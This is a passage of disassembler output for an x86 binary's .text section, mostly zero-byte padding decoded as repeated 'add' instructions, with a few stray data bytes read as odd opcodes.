                           .text:00401e65 00 00                            add    %al,(%eax)
                           .text:00401e67 00 00                            add    %al,(%eax)
                           .text:00401e69 00 00                            add    %al,(%eax)
                           .text:00401e6b 00 00                            add    %al,(%eax)
                           .text:00401e6d 00 00                            add    %al,(%eax)
                           .text:00401e6f 00 00                            add    %al,(%eax)
                           .text:00401e71 00 00                            add    %al,(%eax)
                           .text:00401e73 00 00                            add    %al,(%eax)
                           .text:00401e75 00 00                            add    %al,(%eax)
                           .text:00401e77 00 00                            add    %al,(%eax)
                           .text:00401e79 00 00                            add    %al,(%eax)
                           .text:00401e7b 00 00                            add    %al,(%eax)
                           .text:00401e7d 00 00                            add    %al,(%eax)
                           .text:00401e7f 00 00                            add    %al,(%eax)
                           .text:00401e81 00 00                            add    %al,(%eax)
                           .text:00401e83 00 00                            add    %al,(%eax)
                           .text:00401e85 00 00                            add    %al,(%eax)
                           .text:00401e87 00 00                            add    %al,(%eax)
                           .text:00401e89 00 00                            add    %al,(%eax)
                           .text:00401e8b 00 00                            add    %al,(%eax)
                           .text:00401e8d 00 00                            add    %al,(%eax)
                           .text:00401e8f 00 00                            add    %al,(%eax)
                           .text:00401e91 00 00                            add    %al,(%eax)
                           .text:00401e93 00 00                            add    %al,(%eax)
                           .text:00401e95 00 00                            add    %al,(%eax)
                           .text:00401e97 00 00                            add    %al,(%eax)
                           .text:00401e99 00 00                            add    %al,(%eax)
                           .text:00401e9b 00 00                            add    %al,(%eax)
                           .text:00401e9d 00 00                            add    %al,(%eax)
                           .text:00401e9f 00 00                            add    %al,(%eax)
                           .text:00401ea1 00 00                            add    %al,(%eax)
                           .text:00401ea3 00 00                            add    %al,(%eax)
                           .text:00401ea5 00 00                            add    %al,(%eax)
                           .text:00401ea7 00 00                            add    %al,(%eax)
                           .text:00401ea9 00 00                            add    %al,(%eax)
                           .text:00401eab 00 00                            add    %al,(%eax)
                           .text:00401ead 00 00                            add    %al,(%eax)
                           .text:00401eaf 00 00                            add    %al,(%eax)
                           .text:00401eb1 00 00                            add    %al,(%eax)
                           .text:00401eb3 00 00                            add    %al,(%eax)
                           .text:00401eb5 00 00                            add    %al,(%eax)
                           .text:00401eb7 00 00                            add    %al,(%eax)
                           .text:00401eb9 00 00                            add    %al,(%eax)
                           .text:00401ebb 00 00                            add    %al,(%eax)
                           .text:00401ebd 00 00                            add    %al,(%eax)
                           .text:00401ebf 00 00                            add    %al,(%eax)
                           .text:00401ec1 00 00                            add    %al,(%eax)
                           .text:00401ec3 00 00                            add    %al,(%eax)
                           .text:00401ec5 00 00                            add    %al,(%eax)
                           .text:00401ec7 00 00                            add    %al,(%eax)
                           .text:00401ec9 00 00                            add    %al,(%eax)
                           .text:00401ecb 00 00                            add    %al,(%eax)
                           .text:00401ecd 00 00                            add    %al,(%eax)
                           .text:00401ecf 00 00                            add    %al,(%eax)
                           .text:00401ed1 00 00                            add    %al,(%eax)
                           .text:00401ed3 00 00                            add    %al,(%eax)
                           .text:00401ed5 00 00                            add    %al,(%eax)
                           .text:00401ed7 00 00                            add    %al,(%eax)
                           .text:00401ed9 00 00                            add    %al,(%eax)
                           .text:00401edb 00 00                            add    %al,(%eax)
                           .text:00401edd 00 00                            add    %al,(%eax)
                           .text:00401edf 00 00                            add    %al,(%eax)
                           .text:00401ee1 00 00                            add    %al,(%eax)
                           .text:00401ee3 00 00                            add    %al,(%eax)
                           .text:00401ee5 00 00                            add    %al,(%eax)
                           .text:00401ee7 00 00                            add    %al,(%eax)
                           .text:00401ee9 00 00                            add    %al,(%eax)
                           .text:00401eeb 00 00                            add    %al,(%eax)
                           .text:00401eed 00 00                            add    %al,(%eax)
                           .text:00401eef 00 00                            add    %al,(%eax)
                           .text:00401ef1 00 00                            add    %al,(%eax)
                           .text:00401ef3 00 00                            add    %al,(%eax)
                           .text:00401ef5 00 00                            add    %al,(%eax)
                           .text:00401ef7 00 00                            add    %al,(%eax)
                           .text:00401ef9 00 00                            add    %al,(%eax)
                           .text:00401efb 00 00                            add    %al,(%eax)
                           .text:00401efd 00 00                            add    %al,(%eax)
                           .text:00401eff 00 00                            add    %al,(%eax)
                           .text:00401f01 00 00                            add    %al,(%eax)
                           .text:00401f03 00 00                            add    %al,(%eax)
                           .text:00401f05 00 00                            add    %al,(%eax)
                           .text:00401f07 00 00                            add    %al,(%eax)
                           .text:00401f09 00 00                            add    %al,(%eax)
                           .text:00401f0b 00 00                            add    %al,(%eax)
                           .text:00401f0d 00 00                            add    %al,(%eax)
                           .text:00401f0f 00 00                            add    %al,(%eax)
                           .text:00401f11 00 00                            add    %al,(%eax)
                           .text:00401f13 00 00                            add    %al,(%eax)
                           .text:00401f15 00 00                            add    %al,(%eax)
                           .text:00401f17 00 e1                            add    %ah,%cl
                           .text:00401f19 02 00                            add    (%eax),%al
                           .text:00401f1b 00 00                            add    %al,(%eax)
                           .text:00401f1d 00 00                            add    %al,(%eax)
                           .text:00401f1f 00 50 49                         add    %dl,0x49(%eax)
                           .text:00401f22 50                               push   %eax
                           .text:00401f23 06                               push   %es
                           .text:00401f24 00 00                            add    %al,(%eax)
                           .text:00401f26 00 00                            add    %al,(%eax)
                           .text:00401f28 a0 4a c8 05 00                   mov    0x5c84a,%al
                           .text:00401f2d 00 00                            add    %al,(%eax)
                           .text:00401f2f 00 00                            add    %al,(%eax)
                           .text:00401f31 00 00                            add    %al,(%eax)
                           .text:00401f33 00 00                            add    %al,(%eax)
                           .text:00401f35 00 00                            add    %al,(%eax)
                           .text:00401f37 00 00                            add    %al,(%eax)
                           .text:00401f39 00 00                            add    %al,(%eax)
                           .text:00401f3b 00 00                            add    %al,(%eax)
                           .text:00401f3d 00 00                            add    %al,(%eax)
                           .text:00401f3f 00 00                            add    %al,(%eax)
                           .text:00401f41 00 00                            add    %al,(%eax)
                           .text:00401f43 00 00                            add    %al,(%eax)
                           .text:00401f45 00 00                            add    %al,(%eax)
                           .text:00401f47 00 00                            add    %al,(%eax)
                           .text:00401f49 00 00                            add    %al,(%eax)
                           .text:00401f4b 00 00                            add    %al,(%eax)
                           .text:00401f4d 00 00                            add    %al,(%eax)
                           .text:00401f4f 00 24 17                         add    %ah,(%edi,%edx,1)
                           .text:00401f52 f6 60 38                         mulb   0x38(%eax)
                           .text:00401f55 9e                               sahf   
                           .text:00401f56 75 e6                            jne    0x00401f3e
                           .text:00401f58 00 33                            add    %dh,(%ebx)
                           .text:00401f5a 65 c5 bf 7f 00 00 d0             lds    %gs:-0x2fffff81(%edi),%edi
                           .text:00401f61 97                               xchg   %eax,%edi
                           .text:00401f62 32 b5 bf 7f 00 00                xor    0x7fbf(%ebp),%dh
                           .text:00401f68 00 00                            add    %al,(%eax)
                           .text:00401f6a 00 00                            add    %al,(%eax)
                           .text:00401f6c 00 00                            add    %al,(%eax)
                           .text:00401f6e 00 00                            add    %al,(%eax)
                           .text:00401f70 00 00                            add    %al,(%eax)
                           .text:00401f72 00 00                            add    %al,(%eax)
                           .text:00401f74 00 00                            add    %al,(%eax)
                           .text:00401f76 00 00                            add    %al,(%eax)
                           .text:00401f78 00 00                            add    %al,(%eax)
                           .text:00401f7a 00 00                            add    %al,(%eax)
                           .text:00401f7c 00 00                            add    %al,(%eax)
                           .text:00401f7e 00 00                            add    %al,(%eax)
                           .text:00401f80 00 00                            add    %al,(%eax)
                           .text:00401f82 00 00                            add    %al,(%eax)
                           .text:00401f84 00 00                            add    %al,(%eax)
                           .text:00401f86 00 00                            add    %al,(%eax)
                           .text:00401f88 00 00                            add    %al,(%eax)
                           .text:00401f8a 00 00                            add    %al,(%eax)
                           .text:00401f8c 00 00                            add    %al,(%eax)
                           .text:00401f8e 00 00                            add    %al,(%eax)
                           .text:00401f90 00 00                            add    %al,(%eax)
                           .text:00401f92 00 00                            add    %al,(%eax)
                           .text:00401f94 00 00                            add    %al,(%eax)
                           .text:00401f96 00 00                            add    %al,(%eax)
                           .text:00401f98 07                               pop    %es
                           .text:00401f99 21 90 ff 32 7a 0a                and    %edx,0xa7a32ff(%eax)
                           .text:00401f9f 8f                               (bad)  
                           .text:00401fa0 70 55                            jo     0x00401ff7
                           .text:00401fa2 df bd bf 7f 00 00                fistpll 0x7fbf(%ebp)
                           .text:00401fa8 10 39                            adc    %bh,(%ecx)
                           .text:00401faa 33 b5 bf 7f 00 00                xor    0x7fbf(%ebp),%esi
                           .text:00401fb0 68 19 74 74 a6                   push   $0xa6747419
                           .text:00401fb5 1b 75 71                         sbb    0x71(%ebp),%esi
                           .text:00401fb8 e0 54                            loopne 0x0040200e
                           .text:00401fba df bd bf 7f 00 00                fistpll 0x7fbf(%ebp)
                           .text:00401fc0 70 fc                            jo     0x00401fbe
                           .text:00401fc2 9d                               popf   
                           .text:00401fc3 04 00                            add    $0x0,%al
                           .text:00401fc5 00 00                            add    %al,(%eax)
                           .text:00401fc7 00 00                            add    %al,(%eax)
                           .text:00401fc9 00 00                            add    %al,(%eax)
                           .text:00401fcb 00 00                            add    %al,(%eax)
                           .text:00401fcd 00 00                            add    %al,(%eax)
                           .text:00401fcf 00 00                            add    %al,(%eax)
                           .text:00401fd1 00 00                            add    %al,(%eax)
                           .text:00401fd3 00 00                            add    %al,(%eax)
                           .text:00401fd5 00 00                            add    %al,(%eax)
                           .text:00401fd7 00 00                            add    %al,(%eax)
                           .text:00401fd9 00 00                            add    %al,(%eax)
                           .text:00401fdb 00 00                            add    %al,(%eax)
                           .text:00401fdd 00 00                            add    %al,(%eax)
                           .text:00401fdf 00 00                            add    %al,(%eax)
                           .text:00401fe1 00 00                            add    %al,(%eax)
                           .text:00401fe3 00 00                            add    %al,(%eax)
                           .text:00401fe5 00 00                            add    %al,(%eax)
                           .text:00401fe7 00 00                            add    %al,(%eax)
                           .text:00401fe9 00 00                            add    %al,(%eax)
                           .text:00401feb 00 00                            add    %al,(%eax)
                           .text:00401fed 00 00                            add    %al,(%eax)
                           .text:00401fef 00 00                            add    %al,(%eax)
                           .text:00401ff1 00 00                            add    %al,(%eax)
                           .text:00401ff3 00 00                            add    %al,(%eax)
                           .text:00401ff5 00 00                            add    %al,(%eax)
                           .text:00401ff7 00 00                            add    %al,(%eax)
                           .text:00401ff9 00 00                            add    %al,(%eax)
                           .text:00401ffb 00 00                            add    %al,(%eax)
                           .text:00401ffd 00 00                            add    %al,(%eax)
                           .text:00401fff 00                               .byte 0x0
